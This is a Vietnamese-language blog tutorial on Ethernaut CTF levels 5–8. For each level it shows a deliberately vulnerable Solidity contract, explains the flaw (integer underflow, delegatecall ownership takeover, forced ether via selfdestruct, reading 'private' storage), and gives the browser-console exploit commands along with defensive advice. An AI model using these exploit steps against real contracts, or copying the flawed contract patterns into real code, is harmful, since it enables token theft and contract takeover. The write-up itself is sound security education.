Chào các bạn, hôm nay chúng ta sẽ đến với phần 2 của chuỗi bài *Blockchain - hacking smart contract with Ethernaut CTF*

Ở bài trước, chúng ta đã được tiếp cận với những lỗ hổng cơ bản và dễ dàng nhất, ở phần này chúng ta sẽ tiếp cận 4 lỗ hổng khác với độ khó cao hơn, mình sẽ giải thích từng bước cụ thể kèm phân tích để các bạn có thể nắm được trực quan và đơn giản nhất.

Hi vọng sẽ mang lại nhiều điều thú vị cho các bạn.

**The Ethernaut**: https://ethernaut.zeppelin.solutions/

Một vài recommend:

- Sẽ tốt hơn nếu bạn có kiến thức về Blockchain và Smart Contract
- Sẽ tốt hơn nếu bạn có kiến thức về Solidity và Web3js
- Sẽ là tốt hơn nếu bạn biết cách sử dụng Remix IDE hoặc Truffle

## 5. Token 　★★★☆☆☆
**Nhiệm vụ**: Có 20 token trong tay, ta cần chôm ở đâu đó vài token nữa (càng nhiều càng tốt)

```js
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### Phân tích

- Trong các ngôn ngữ lập trình static type như C/C++/C#/Java, có lẽ chúng ta hầu như không xa lạ gì với khái niệm `overflow` - hiện tượng tràn số khi tính toán số lớn hơn giá trị MAX của kiểu dữ liệu đã khao báo. Nhưng có một khái niệm nữa ít được để ý hơn nhưng cũng vô cùng quan trọng, đó là `underflow` - hiện tượng mà khi số nhỏ dưới giá trị MIN của kiểu dữ liệu đã khai báo thì số đó sẽ được quay vòng trở lại từ MAX, thật tai hại nếu không handle trường hợp này.
- Trong bài này, kiểu dữ liệu đang dùng là `uint256`, giới hạn từ 0 cho tới $ 2^{256} $
- Ở đây ta có đoạn

```js
require(balances[msg.sender] - _value >= 0);
```

những tưởng rằng điều kiện này chỉ đạt được khi balance của msg.sender lớn hơn giá trị value; nhưng không, điều kiện này sẽ trở thành auto true. Thật vậy, nếu như `balance >= value` thì hiển nhiên sẽ là *true*, còn nếu như `balance < value` thì khi `balance - value`  sẽ xảy ra hiện tượng `underflow` và trở nên vô cùng lớn, theo đó điệu kiện cũng sẽ là *true*. Tóm lại, ta sẽ luôn luôn pass.

### Solution

- Trên Chrome console để kiểm tra balance hiện tại:

```js
await contract.balanceOf(player).then(x => x.toNumber())
20
```

- Do điều kiện auto pass, ta sẽ transfer cho một địa chỉ nào đó một giá trị lớn hơn 20 - là số token hiện tại của ta, khi đó phép toán `balances[msg.sender] -= value` sẽ xảy ra hiện tượng *underflow* và ta sẽ sở hữu một lượng **vô cùng lớn** token: 

```js
contract.transfer(player, 21)
```

- Kiểm tra lại balance một lần nữa, wow !! !

```js
await contract.balanceOf(player).then(x => x.toNumber())
1.157920892373162e+77
```

- Submit & all done!

### Bình luận 

- Overflow hay Underflow đều nguy hiểm, hãy dùng thư viện [Safe Math](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol) cho bất cứ phép toán nào của bạn.

## 6. Delegation　★★★★☆☆

**Nhiệm vụ**: Chiếm quyền owner.

```js
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

### Phân tích

- Để từ trong contract này gọi hàm của contract khác, ngoài cách dùng instance của contract khác để gọi, solidity cung cấp cho ta một số hàm *low-level* khác để thay thế: đó là `call` và `delegatecall`. Ngay từ chú thích *low-level* ta đã biết rằng đây là những hàm *nguy hiểm* rồi, nên việc hiểu rõ cách sử dụng chúng là một điều tất yếu.
- Việc giải thích cụ thể về `call` và `delegatecall` khá dài và nằm ngoài phạm vi bài viết. Bạn có thể đọc thêm [tại đây](https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall). Cơ bản thì `delegatecall` chỉ mượn tên hàm của contract khác, mọi thông tin về storage vẫn là storage của contract đang sử dụng.
-  Contract *Delegate* có hàm `pwn()` để trao quyền owner, vậy mục tiêu của chúng ta là làm sao để kích hoạt được hàm này.
-  Contract *Delegation* có fallback function sử dụng `delegatecall`, nó gợi ý cho chúng ta trigger fallback với msg.data chính là hàm `pwn()`
-  Dù *fallback function* trong contract *Delegation* không có payable, nghĩa là không thể nhận ether, ta vẫn có thể kích hoạt được nó bằng cách send cho nó *0 ether*, thật là vi diệu!
-  Về *fallback function*, các bạn có thể tham khảo thêm tại [documentation của Solidity](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function) hoặc tại bài viết [phần 1](https://viblo.asia/p/blockchain-hacking-smart-contract-with-ethernaut-ctf-part-1-bWrZnN8pZxw)
-  Một lưu ý về *msg.data*: để truyền vào hàm `pwn()`, ta không phải truyền plain text, mà solidity sẽ gọi bằng *bytes4 hash* của nó, tức 4 byte đầu của chuỗi `hash("pwn()")` cụ thể ta sẽ phải truyền vào tham số như sau: `web3.sha3("pwn()").slice(0, 10)`

### Solution

- Trên Chrome console, kiểm tra contract owner:

```js
await contract.owner()
```

- Send 0 ether kèm data để trigger fallback:

```js
await contract.sendTransaction({data:web3.sha3("pwn()").slice(0,10)});
```

- Kiểm tra lại contract owner xem đã là mình chưa:

```js
await contract.owner()
```

- Submit & all done!

### Bình luận

- Hãy luôn luôn hiểu rõ những hàm bạn code, đặc biệt là các hàm low-level.
- Hạn chế tối đa sử dụng `delegatecall` cũng như các hàm low-level khác.
- Tham khảo thêm: https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue

## 7. Force　★★★★★☆

**Nhiệm vụ**: Bằng cách nào đó chuyển cho một contract rỗng một ít ether.

```js
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### Phân tích

- Contract không tí code nào - wtf ? 
- Đây là một bài thuộc dạng bài *biết thì rất dễ, không biết thì không biết đằng nào mà lần*. Điều ta cần biết duy nhất chính là hàm `selfdestruct`.
- Với một contract, khi gọi hàm `selfdestruct(someone_addr)` thì contract sẽ hủy và toàn bộ tiền của contract sẽ gửi về someone_addr, đây có thể là địa chỉ bất kì của người dùng hoặc của contract nào đó.
 
### Solution

- Trên Remix IDE, chuẩn bị một contract có thể gửi tiền vào, và một hàm thực hiện `selfdestruct` trong đó, nhớ thay địa chỉ trong `selfdestruct` bằng địa chỉ instance của bạn:

```js
contract AnotherContract {
    
    function sendAll() public {
        // replace by your instance address
        selfdestruct(0xb3a12d511131ada7a145a5a9dc7399756cae6c4b);
    }
    
    function() public payable {
        
    }
}
```

- Compile & send cho *AnotherContract* vài ether.
- Gọi hàm `sendAll()` để hủy contract & gửi tiền vào contract đề bài yêu cầu.
- Submit & all done!

### Bình luận

- Bình luận gì nữa, cần phải tìm hiểu thêm nhiều thôi (okay).

## 8. Vault　★★★☆☆☆　

**Nhiệm vụ**: Tìm password và unlock 

```js
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### Phân tích 

- Ta biết rằng blockchain là minh bạch, và mọi thông tin trên đó ta đều có thể nhìn thấy được, kể cả những biến khai báo là `private`. Và trong bài này, điều đó không là ngoại lệ.
- web3js cung cấp cho ta một hàm `web3.eth.getStorageAt` để lấy thông tin trên blockchain. Ta sẽ dùng nó để tìm password.

### Solution

- Contract Vault có 2 tham số: `looked` và `password`, nó sẽ lưu `looked` tại vị trí 0 và `password` tại vị trí 1 trong storage.
- `password` có kiểu dữ liệu là bytes32, nên để hiển thị ra ký tự ASCII ta phải dùng hàm `web3.toAscii`
- Trong chrome console, ta chạy lệnh sau
```js
web3.eth.getStorageAt("0x712d4d349abd61d1ff12be06f8ff55cc7fb1052b", 1, (err, result) => alert(web3.toAscii(result)))
```

- Yeah, ta nhận được password là: `A very strong secret password :)`
- Tiến hành unlock:

```js
await contract.unlock('A very strong secret password :)');
```

- Kiểm tra lại tình trạng khóa:

```js
await contract.locked.call();
false
```

- Submit & all done! 

### Bình luận

- `private` trong blockchain hay solidity nói riêng chỉ là một phương thức để ngăn quyền truy xuất trong contract mà thôi, chứ không có nghĩa là nó bí mật đối với người dùng.
- Nếu muốn thông tin private, hãy mã hóa nó trước khi đưa lên blockchain.
- Không nên lưu trữ các thông tin nhạy cảm trên blockchain, dù nó có được mã hóa hay không.


## Conclusion
Vậy là chúng ta đã đi qua được 2/3 chặng đường, chúc các bạn có những giây phút vui vẻ.

Enjoy coding!

## References
- [The Ethernaut](https://ethernaut.zeppelin.solutions/)
- [Remix](https://remix.ethereum.org/)
- [Solidity Docs](http://solidity.readthedocs.io/en/develop/types.html#members-of-addresses
)
- [Recommendations for Smart Contract Security in Solidity](https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue)